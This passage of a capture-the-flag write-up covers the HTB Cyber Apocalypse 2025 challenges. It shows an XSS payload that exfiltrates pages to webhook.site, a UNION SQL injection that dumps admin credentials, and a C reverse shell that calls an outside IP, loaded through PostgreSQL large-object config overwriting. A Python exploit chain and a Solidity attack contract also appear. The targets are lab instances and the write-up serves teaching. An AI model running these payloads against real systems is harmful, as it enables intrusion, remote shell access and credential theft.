+</span></span><span style="display:flex;"><span>Referer: http://94.237.58.253:42840/auction/1
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Cookie: connect.sid=s%3AjV_r-rE5ZuUUPYqMHWa9OCS63L2azs9v.X89Ti%2BqNWsOKA%2FOGuoG0OkVbDHbWNZBMMaR379zYeZo
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{&#34;bid&#34;:[&#34;&#39;&gt;&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/tables&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span>=&gt;<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">page</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://webhook.site/bffa85a9-c19d-4e8c-b609-3eee46608163&#39;</span>, {<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">page</span>}))&lt;/<span style="color:#f92672">script</span>&gt;<span style="color:#75715e">&lt;!--&#34;]}
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;success&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;tables&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;table_name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;auctions&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;table_name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;bids&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;table_name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;submissions&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;table_name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;users&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Our XSS works.</p>
+<p>We notice an SQL injection in the <code>/table</code> endpoint. We can grab the <code>users</code> table and the SQL version using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>users<span style="color:#e6db74">&#34; UNION SELECT 1, null, null -- 
+</span></span></span></code></pre></div><p>And boom:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;hOS7tz6kSDgn0wE0SIHXUKv6U5ku9Fe71Ik4OL4dMXg=&#34;</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;aelmo&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;oauth_default_password&#34;</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;PostgreSQL 17.4 on x86_64-alpine-linux-musl, compiled by gcc (Alpine 14.2.0) 14.2.0, 64-bit&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>I searched for techniques for a postgres RCE using SELECT statements, before my teammate <strong>Logan0x</strong> found this great walkthrough:</p>
+<ul>
+<li><a href="https://adeadfed.com/posts/postgresql-select-only-rce/">https://adeadfed.com/posts/postgresql-select-only-rce/</a></li>
+</ul>
+<p>Essentially, I spun up <code>ngrok</code> and used the exact same postgres module demonstrated in the article. I used the <code>ngrok</code> endpoint&rsquo;s IP in there too:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>include <span style="color:#f92672">&lt;</span>stdio.h<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;postgres.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;fmgr.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef PG_MODULE_MAGIC
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>PG_MODULE_MAGIC;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_init</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">13492</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in revsockaddr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sockt <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    revsockaddr.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>    revsockaddr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(port);
+</span></span><span style="display:flex;"><span>    revsockaddr.sin_addr.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(<span style="color:#e6db74">&#34;3.64.4.198&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">connect</span>(sockt, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>) <span style="color:#f92672">&amp;</span>revsockaddr,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(revsockaddr));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(sockt, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(sockt, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(sockt, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> argv[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;sh&#34;</span>, NULL};
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">execvp</span>(<span style="color:#e6db74">&#34;sh&#34;</span>, argv);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>To compile it for the target environment, I found the postgres development package name <a href="https://alpine.pkgs.org/3.21/alpine-main-x86_64/postgresql17-dev-17.4-r0.apk.html">for Alpine</a>, then compiled it within our local Docker environment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apk add postgresql17-dev
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gcc -I<span style="color:#66d9ef">$(</span>pg_config --includedir-server<span style="color:#66d9ef">)</span> -shared -fPIC -nostartfiles -o payload.so payload.c
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>payload.c           payload.so
+</span></span></code></pre></div><p>This allows us to create a small, shared executable that will still run correctly in the target environment. I copied the <code>.so</code> from my local Docker container.</p>
+<p>The demonstrated technique makes use of the postgres <code>lo_*</code> function family which deal with &ldquo;large objects&rdquo; and contains means to read and write binary data as well as export them to the file system.</p>
+<p>We use this to overwrite the postgres configuration with one that loads our generated malicious shared object <code>.so</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>listen_addresses <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*&#39;</span>
+</span></span><span style="display:flex;"><span>max_connections <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shared_buffers <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>MB
+</span></span><span style="display:flex;"><span>dynamic_shared_memory_type <span style="color:#f92672">=</span> posix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>max_wal_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>GB
+</span></span><span style="display:flex;"><span>min_wal_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>MB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log_timezone <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>Etc<span style="color:#f92672">/</span>UTC<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>datestyle <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>iso, mdy<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>timezone <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>Etc<span style="color:#f92672">/</span>UTC<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lc_messages <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>en_US.utf8<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>lc_monetary <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>en_US.utf8<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>lc_numeric <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>en_US.utf8<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>lc_time <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>en_US.utf8<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>default_text_search_config <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>pg_catalog.english<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dynamic_library_path <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>tmp:<span style="color:#960050;background-color:#1e0010">$</span>libdir<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>session_preload_libraries <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>payload.so<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>We then run a series of SELECT-only SQL commands to upload our configuration, our malicious <code>.so</code> and finally call <code>pg_reload_conf()</code>.</p>
+<p>The following code provides a summary of the exploit. First, we call <code>xss()</code> to exfiltrate the admin&rsquo;s password.</p>
+<p>We then acquire an admin cookie and use it for the SQL injection step. This is done for convenience to perform the SQL injection directly instead of through the bot via XSS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx<span style="color:#f92672">,</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://94.237.58.253:44991&#39;</span>
+</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;s%3AP_uq7DzlnuZpJ4489vj8Dozvf3k9ESL9.LeFxOx1UafUc</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">zGVBYTl661z8OTSL2w1L7b1z5FBV9k&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>auction_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>Client(cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;connect.sid&#39;</span>: cookie})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xss</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/auctions/</span><span style="color:#e6db74">{</span>auction_id<span style="color:#e6db74">}</span><span style="color:#e6db74">/bids&#39;</span>, json<span style="color:#f92672">=</span>dict(
+</span></span><span style="display:flex;"><span>        bid <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;&#39;&#39;&#39;&gt;&lt;/div&gt;&lt;script&gt;</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">function inject(step, injection) {setTimeout(() =&gt; {fetch(&#39;/table&#39;, {method: &#39;POST&#39;,body: JSON.stringify({tableName: injection}),headers: {&#39;Content-Type&#39;: &#39;application/json&#39;}}).then(r=&gt;r.text()).then(page =&gt; fetch(&#39;http://webhook.site/hook&#39;, {method: &#39;POST&#39;, body: page}))}, step*300)};inject(0, `users&#34; UNION SELECT 1, null, null -- `)</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;/script&gt;&lt;!--</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>    ))
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>raise_for_status()
+</span></span><span style="display:flex;"><span>    print(r)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/submissions&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>,
+</span></span><span style="display:flex;"><span>                                    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;b&#34;</span>,
+</span></span><span style="display:flex;"><span>                                    <span style="color:#e6db74">&#34;url&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://127.0.0.1:1337/auction/</span><span style="color:#e6db74">{</span>auction_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>                                    <span style="color:#e6db74">&#34;category&#34;</span>: <span style="color:#e6db74">&#34;c&#34;</span>})
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>raise_for_status()
+</span></span><span style="display:flex;"><span>    print(r)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sqli</span>(payload):
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/table&#39;</span>, json<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;tableName&#39;</span>: payload
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;results&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[*] Payload started&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. find config loc</span>
+</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#39;sourcefile FROM pg_file_settings&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. load malicious config from file</span>
+</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CAST((SELECT lo_from_bytea(133338, decode(&#39;</span><span style="color:#e6db74">{</span>malicious_config<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;hex&#39;))) AS text)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. write malicious file to disk</span>
+</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;CAST((SELECT lo_export(133338, &#39;/var/lib/postgresql/data/postgresql.conf&#39;)) AS text)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. get version</span>
+</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;version()&#34;</span>)
+</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CAST((SELECT lo_from_bytea(133340, decode(&#39;</span><span style="color:#e6db74">{</span>so_base64<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;base64&#39;))) AS text)&#34;</span>)
+</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;CAST((SELECT lo_export(133340, &#39;/tmp/payload.so&#39;)) AS text)&#34;</span>)
+</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;CAST((SELECT pg_reload_conf()) AS text)&#34;</span>)
+</span></span></code></pre></div><p>On the next SQL query, we get a hit:
+<img src="/posts/htb-cyber-apocalypse-2025-writeup/aurors_flag.png"></p>
+<p><code>HTB{l00k_0ut_f0r_0auth_155u35}</code></p>
+<blockquote>
+<p>Note: I later confirmed with an HTB admin and he said:
+<img src="/posts/htb-cyber-apocalypse-2025-writeup/intended_aurors.png"></p>
+</blockquote>
+<h2 id="blockchain-eldorion---very-easy">Blockchain: Eldorion - Very Easy<a href="#blockchain-eldorion---very-easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This was my first time ever working with smart contracts or blockchain challenges. ChatGPT did ease the transition and I realize how similar it is to traditional &ldquo;Web 2.0&rdquo; tasks.</p>
+<p>It&rsquo;s just the same code review and logic flaws, indeed with a sweet twist, but it is still the same.</p>
+<p>This challenge had <code>Eldorion</code>, who had his health reset at the start of every block. I deployed a smart contract that performed multiple attacks in a single transaction, essentially defeating <code>Eldorion</code>.</p>
+<p>Receiving our connection information:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 94.237.54.176 <span style="color:#ae81ff">59994</span> -vn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>94.237.54.176<span style="color:#f92672">]</span> <span style="color:#ae81ff">59994</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> - Get connection information
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> - Restart instance
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> - Get flag
+</span></span><span style="display:flex;"><span>Select action <span style="color:#f92672">(</span>enter number<span style="color:#f92672">)</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No running node found. Launching new node...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Player Private Key : 0x9d5365fea16949ff1bda52f514b69ec95360bf9bb791bfc6da9c135f5bc7cbc9
+</span></span><span style="display:flex;"><span>Player Address     : 0xEEF218db05733A58c2904885eC17643a69Ef2b49
+</span></span><span style="display:flex;"><span>Target contract    : 0x84346FaE15aaBC3A7093c97C4FaF28c1505D4B4d
+</span></span><span style="display:flex;"><span>Setup contract     : 0x329fEc32949B9B9b6731eB05A9e70d3758310782
+</span></span></code></pre></div><p>Our exploit smart contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">28</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IEldorion</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>(<span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">damage</span>) <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">PoCAttack</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">IEldorion</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">target</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_target</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">IEldorion</span>(<span style="color:#a6e22e">_target</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// This function bundles three attack calls in one transaction.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">defeat</span>() <span style="color:#a6e22e">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">attack</span>(<span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">attack</span>(<span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">attack</span>(<span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Putting it all together:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># we must add --broadcast to actually run it on the blockchain</span>
+</span></span><span style="display:flex;"><span>forge create --broadcast --rpc-url http://94.237.54.176:56612 --private-key 0x9d5365fea16949ff1bda52f514b69ec95360bf9bb791bfc6da9c135f5bc7cbc9 PoCAttack --constructor-args 0x84346FaE15aaBC3A7093c97C4FaF28c1505D4B4d
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>⠊<span style="color:#f92672">]</span> Compiling...
+</span></span><span style="display:flex;"><span>No files changed, compilation skipped
+</span></span><span style="display:flex;"><span>Deployer: 0xEEF218db05733A58c2904885eC17643a69Ef2b49
+</span></span><span style="display:flex;"><span>Deployed to: 0xdF984b43Be2507f4dA173D0b51B00248cf9B323c
+</span></span><span style="display:flex;"><span>Transaction hash: 0xc996cdbc61709288a99d188fe725bf4cde88ae9213b6c150c9c00991296666b2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># execute our contract using our `Deployed to` address from above</span>
+</span></span><span style="display:flex;"><span>cast send 0xdF984b43Be2507f4dA173D0b51B00248cf9B323c <span style="color:#e6db74">&#34;defeat()&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --rpc-url http://94.237.54.176:56612 <span style="color:#ae81ff">\ </span>                                                      
+</span></span><span style="display:flex;"><span>  --private-key 0x9d5365fea16949ff1bda52f514b69ec95360bf9bb791bfc6da9c135f5bc7cbc9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>blockHash            0x97cf5db1ceff37e36419bf38c20363d7c0661acc51f3201ffec236de04c21efc
+</span></span><span style="display:flex;"><span>blockNumber          <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>contractAddress      
+</span></span><span style="display:flex;"><span>cumulativeGasUsed    <span style="color:#ae81ff">53940</span>
+</span></span><span style="display:flex;"><span>effectiveGasPrice    <span style="color:#ae81ff">1000000000</span>
+</span></span><span style="display:flex;"><span>from                 0xEEF218db05733A58c2904885eC17643a69Ef2b49
+</span></span><span style="display:flex;"><span>gasUsed              <span style="color:#ae81ff">53940</span>
